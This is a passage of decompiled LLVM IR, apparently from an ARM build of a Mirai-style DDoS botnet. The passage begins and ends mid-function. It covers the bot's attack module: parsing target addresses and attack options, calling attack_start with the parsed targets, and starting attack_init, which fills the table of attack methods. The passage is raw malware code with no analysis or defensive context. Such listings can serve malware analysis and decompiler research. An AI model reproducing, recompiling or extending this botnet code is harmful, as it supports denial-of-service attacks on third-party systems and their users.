  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_14284.33 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_14284.33 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_23228.28 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2322c.30 to i32), i32* @r6, align 4
  store i32 36588, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_23229.37 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_2322c.30, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 36588, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 36588, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_23228.28 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_23229.37 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_a088.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_23229.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_2322c.30, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_a088.39 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
